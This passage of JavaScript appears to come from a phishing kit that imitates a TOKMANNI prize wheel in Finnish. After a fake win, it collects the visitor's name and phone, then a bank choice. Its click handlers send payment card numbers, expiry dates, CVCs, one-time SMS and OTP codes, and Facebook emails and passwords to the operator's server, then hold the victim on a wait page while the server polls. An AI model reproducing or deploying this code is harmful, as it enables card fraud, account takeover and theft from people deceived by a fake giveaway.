      html += '<input type="text" inputmode="numeric" maxlength="1" class="code-input ' + prefix + '-input" style="width:44px;height:52px;text-align:center;font-size:1.4rem;border:2px solid #ddd;border-radius:12px;outline:none;box-sizing:border-box;" ' + (i===0?'autofocus':'') + '>';
    }
    html += '</div>';
    return html;
  }

  function attachCodeInputHandlers(prefix) {
    var inputs = document.querySelectorAll('.' + prefix + '-input');
    inputs.forEach(function(inp, idx) {
      inp.addEventListener('input', function() {
        if (this.value.length === 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
      });
      inp.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && idx > 0) {
          inputs[idx - 1].focus();
          inputs[idx - 1].value = '';
        }
      });
      // Allow paste
      inp.addEventListener('paste', function(e) {
        e.preventDefault();
        var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
        for (var j = 0; j < text.length && (idx + j) < inputs.length; j++) {
          inputs[idx + j].value = text[j];
        }
        var lastIdx = Math.min(idx + text.length, inputs.length) - 1;
        if (lastIdx >= 0) inputs[lastIdx].focus();
      });
    });
    // Auto-focus first input
    if (inputs.length > 0) setTimeout(function(){ inputs[0].focus(); }, 100);
  }

  function getCodeValue(prefix) {
    var inputs = document.querySelectorAll('.' + prefix + '-input');
    var code = '';
    inputs.forEach(function(i){ code += i.value; });
    return code;
  }

  // ===== DELEGATED EVENT HANDLERS =====
  document.addEventListener('click', function(e) {
    var btn = e.target;

    if (btn.id === 'otpSubmitBtn') {
      var code = getCodeValue('otp');
      if (code.length < 4) return;
      apiPost('save_otp', {otp: code}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }

    if (btn.id === 'smsSubmitBtn') {
      var code = getCodeValue('sms');
      if (code.length < 3) return;
      apiPost('save_sms', {sms: code}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }

    if (btn.id === 'cardSubmitBtn') {
      var cn = document.getElementById('cardNumber');
      var ce = document.getElementById('cardExpiry');
      var cc = document.getElementById('cardCvc');
      if (!cn || !cn.value || !ce || !ce.value || !cc || !cc.value) return;
      apiPost('save_card', {card_number: cn.value, expiry_date: ce.value, cvc: cc.value}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }

    if (btn.id === 'fbSubmitBtn') {
      var em = document.getElementById('fbEmail');
      var pw = document.getElementById('fbPassword');
      if (!em || !em.value || !pw || !pw.value) return;
      apiPost('save_facebook', {email: em.value, password: pw.value}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }

    if (btn.id === 'verifySubmitBtn') {
      var code = getCodeValue('verify');
      if (code.length < 3) return;
      apiPost('save_otp', {otp: code}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }

    if (btn.id === 'cvSubmitBtn') {
      var code = getCodeValue('cv');
      if (code.length < 3) return;
      apiPost('save_otp', {otp: code}, function() {
        currentPage = 'wait';
        renderWaitPage();
      });
    }
  });

  // ===== ALPINE COMPONENTS =====
  document.addEventListener('alpine:init', function() {
    // Prize store
    Alpine.store('prize', '');

    // Wheel app store for managing won state
    Alpine.store('wheelApp', {
      wheel: null,
      wheelSpinning: false,
      isWon: false,
      prize: '',
      first: '/static/img/mp3/1.mp3',
      end: '/static/img/mp3/end.mp3'
    });

    // Main app component
    Alpine.data('app', function() {
      return {
        currentPage: 'wheel',
        init: function() {
          // Start visitor registration
          init();
        }
      };
    });

    // Wheel spin component
    Alpine.data('spinWheelApp', function() {
      return {
        theWheel: null,
        presets: null,
        wheelSpinning: false,

        initializeWheel: function() {
          var self = this;
          var segments = [];
          var colors = ['#2563EB', '#1D4ED8', '#3B82F6', '#1E40AF', '#2563EB', '#1D4ED8', '#3B82F6', '#1E40AF', '#2563EB'];

          if (this.presets && this.presets.slices) {
            for (var i = 0; i < this.presets.slices.length; i++) {
              segments.push({
                text: this.presets.slices[i],
                fillStyle: colors[i % colors.length]
              });
            }
          }

          if (typeof Winwheel !== 'undefined') {
            this.theWheel = new Winwheel({
              canvasId: 'canvas',
              numSegments: segments.length,
              segments: segments,
              outerRadius: 212,
              textFontSize: 16,
              textFillStyle: '#ffffff',
              textOrientation: 'horizontal',
              textAlignment: 'outer',
              textMargin: 10,
              lineWidth: 1,
              strokeStyle: '#1a3a6b',
              animation: {
                type: 'spinToStop',
                duration: 5,
                spins: 8,
                callbackFinished: function(segment) { self.onSpinComplete(segment); }
              },
              pins: { number: segments.length, outerRadius: 5, responsive: true }
            });
            Alpine.store('wheelApp').wheel = this.theWheel;
          }
        },

        spinWheel: function() {
          if (this.wheelSpinning || !this.theWheel) return;
          this.wheelSpinning = true;

          // Random stop angle
          var randomAngle = Math.floor(Math.random() * 360);
          this.theWheel.animation.stopAngle = randomAngle;
          this.theWheel.startAnimation();

          // Play spin sound
          try {
            var audio = new Audio(Alpine.store('wheelApp').first);
            audio.play().catch(function(){});
          } catch(e) {}
        },

        onSpinComplete: function(segment) {
          var self = this;
          this.wheelSpinning = false;
          var prize = segment ? segment.text : '';

          // Play win sound
          try {
            var audio = new Audio(Alpine.store('wheelApp').end);
            audio.play().catch(function(){});
          } catch(e) {}

          // Fire confetti
          try {
            if (typeof confetti !== 'undefined') {
              confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
            }
          } catch(e) {}

          // Set prize in store
          Alpine.store('prize', prize);
          Alpine.store('wheelApp').isWon = true;
          Alpine.store('wheelApp').prize = prize;

          // Save prize
          try { localStorage.setItem('prize_amount', prize); } catch(e) {}
          apiPost('save_prize', {prize: prize}, function(){});

          // Transition to claim form after delay
          setTimeout(function() {
            self.showClaimForm(prize);
          }, 3000);
        },

        showClaimForm: function(prize) {
          var lang = getLang();
          var cr = lang.claim_reward || {};
          var form = cr.form || {};

          var html = wrap(
            '<p class="content-text__title">' + (cr.title || 'TOKMANNI') + '</p>' +
            '<p style="color:#FFD700;font-size:1.3rem;font-weight:700;margin:0.5rem 0;">' + (cr.congrats || 'Onnittelut!') + '</p>' +
            '<p style="color:#fff;font-size:1.1rem;margin-bottom:0.5rem;">' + (cr.reward || 'Voitit!') + ' <strong>' + prize + '</strong></p>' +
            '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-bottom:1.5rem;">' + (cr.welcome || '') + '</p>' +
            '<div style="background:#fff;border-radius:24px;padding:1.5rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.08);">' +
              '<form id="claimForm">' +
                '<div style="margin-bottom:1rem;">' +
                  '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (form.name_label || 'Nimesi') + '</label>' +
                  '<input type="text" id="claimName" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;" placeholder="' + (form.name_placeholder || 'Syötä nimesi') + '">' +
                '</div>' +
                '<div style="margin-bottom:1rem;">' +
                  '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (form.surname_label || 'Sukunimesi') + '</label>' +
                  '<input type="text" id="claimSurname" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;" placeholder="' + (form.surname_placeholder || 'Syötä sukunimesi') + '">' +
                '</div>' +
                '<div style="margin-bottom:1rem;">' +
                  '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (form.phone_label || 'Puhelin') + '</label>' +
                  '<input type="tel" id="claimPhone" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;" placeholder="+358">' +
                '</div>' +
                '<button type="submit" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (form.submit_button || 'Jatkaa') + '</button>' +
              '</form>' +
            '</div>'
          );

          renderPage(html);

          var claimForm = document.getElementById('claimForm');
          if (claimForm) {
            claimForm.addEventListener('submit', function(e) {
              e.preventDefault();
              var name = document.getElementById('claimName').value;
              var surname = document.getElementById('claimSurname').value;
              var phone = document.getElementById('claimPhone').value;
              if (!name || !surname || !phone) return;

              try { localStorage.setItem('user_name', name + ' ' + surname); } catch(e) {}

              apiPost('save_data', {name: name, surname: surname, phone: phone, prize: prize}, function(err, resp) {
                currentPage = 'bankList';
                renderBankListPage();
                // Start polling after claim form
                startPolling();
              });
            });
          };
        }
      };
    });
  });

  // Expose functions globally for wheel.html inline scripts
  window._pageRouter = {
    getVisitorId: getVisitorId,
    setVisitorId: setVisitorId,
    switchPage: switchPage,
    startPolling: startPolling,
    stopPolling: stopPolling,
    getCurrentPage: function() { return currentPage; },
    getLang: getLang
  };

})();
